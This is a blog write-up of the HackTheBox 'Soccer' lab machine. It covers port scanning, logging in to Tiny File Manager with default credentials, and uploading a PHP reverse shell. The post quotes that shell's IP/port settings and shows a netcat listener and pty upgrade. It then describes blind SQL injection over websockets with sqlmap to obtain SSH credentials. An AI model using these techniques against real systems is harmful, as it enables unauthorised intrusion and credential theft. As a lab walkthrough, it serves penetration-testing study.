---
layout: post
title: "HackTheBox Write Up - Soccer"
date: 2023-05-03
category: labs
image: '/assets/images/HTB-logo.png'
tags: [labs, educational, guide]
---

### HackTheBox Write Up — Soccer

#### A walkthrough of the ‘Soccer’ box from HackTheBox

![](/assets/images/1jnFpt4i0LUVaVrlqP1E4Gw.png)
#### Scanning & Enumeration

As usual, the first step is to start with an Nmap scan. This revealed ports 22 (SSH), 80 (HTTP), and 9091.

Next I navigated to the webpage, which didn’t have a lot of options available to investigate. Next up is directory busting.

#### **Directory Busting**

![](/assets/images/1N0jZonUbSbE5ypKpdAI5pA.png)

`ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://soccer.htb:80/FUZZ`

Since I’m currently studying for the PNPT from TCM Security and the training is fresh in my mind, I’ll be using FFuF for directory enumeration.

The only real result that came back was the subdomain: `http://soccer.htb/tiny` , which results in a login page that can potentially be brute forced.

#### Initial Access

Before spending time attempting to brute force, let’s first do some OSINT by doing a quick Google search on default credentials for TinyFileManager.

This pays off and saves us some time as the default admin username and password worked and we’re logged in.

![](/assets/images/1CvlPP484HahwYUCEHd80IA.png)

Digging through the ‘Tiny File Manager’ web portal, the first thing that stands out to me is the ‘Upload’ section. This is just asking to be abused and can potentially lead to a reverse shell.

\*Take notice of the permissions set for each file and folder. The ‘/tiny/uploads’ directory is the only folder we have permission to write to.

I decided to use [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) code for the reverse shell from pentestmonkey, which I’ve nicknamed catshell.php for this lab (don’t ask me why).

Be sure to adjust the IP and port before saving the file. Below is a snip it from the code showing where these changes are made.

```
set_time_limit (0);  
$VERSION = "1.0";  
$ip = '127.0.0.1';  // CHANGE THIS  
$port = 1234;       // CHANGE THIS  
$chunk_size = 1400;  
$write_a = null;  
$error_a = null;  
$shell = 'uname -a; w; id; /bin/sh -i';  
$daemon = 0;  
$debug = 0;
```

Next, I set up a listener using netcat:

```
nc -lvnp 4444
```

All we have to do is upload this file and then hit the ‘Direct Link’ button under the ‘Actions’ section. With this, we gain a shell.

The first thing to do is use the following command to get bash:

```
python3 -c "import pty;pty.spawn('/bin/bash')" 
```

Checking the user permissions next, we see our user www-data has low privileges.

![](/assets/images/1Oxn6mA14oA-l13zkoxcUiQ.png)

With this shell we can enumerate further. Referencing the previous findings on port 80/http, I list out the contents of the /etc/nginx/site-enabled directory using the following command:

```
ls /etc/nginx/site-enabled
```

This reveals a file called `soc-player.htb`. When opening this file using cat, it reveals the server\_name: `soc-player.soccer.htb`

I need this to reflect in the /etc/hosts file so I input it, replacing the previous soccer.htb entry.

Navigating to this newly found site we have more options to explore. We now have a few directory listings on the header menu: “Match”, “Login”, “Sign Up”.

I neglected to get a screenshot of this page. But if you can imagine a very simple webpage with some basic directory listings, a robot (or I suppose a prosthetic) soccer leg kicking a flaming soccer ball, and some lorem ipsum giving a brief history of the entire sport of soccer; then you’re up to speed.

Let’s go ahead and sign up. This presents us with one free ticket voucher and an input field where we can check the validity of our ticket ID. This may prove to be an interesting foothold to exploit.

#### Privilege Escalation

Next, I investigate this newly found subdomain further by inspecting the webpage which reveals that Websockets are in use here. Researching possible SQLi for Websockets, we have one that should work found [here](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) that actually automates this.

We’ll need to adjust the parameters for this script. Ensure the “`ws_server`” parameter has the correct URL and the “`data`” contains the “id” parameter as this is what we are using for authentication:

![](/assets/images/1xXN6XCi2hU6M2zAJPIKiwA.png)

Following the directions of the author of this script, I used the following sqlmap command. I just adjusted the tags at the end to narrow down the search a bit. This took a very long time, so keep that in mind if you’re following along.

![](/assets/images/15XQszEZOS4oql-8rlTp4ww.png)

After a long wait and a nice coffee break, SQLMap yielded Database credentials for soccer\_db.

![](/assets/images/1UhU4FA7po_4OcbA2bYQadQ.png)

Using these credentials to establish an SSH connection worked like a charm, so I just navigated to the root folder to obtain the ‘user.txt’ flag.

![](/assets/images/1-_iENcZpdkR5fCBdnlnO5w.png)
#### GAME OVER



By [darkyolks](https://darkyolks.com) originally published on May 3, 2023.

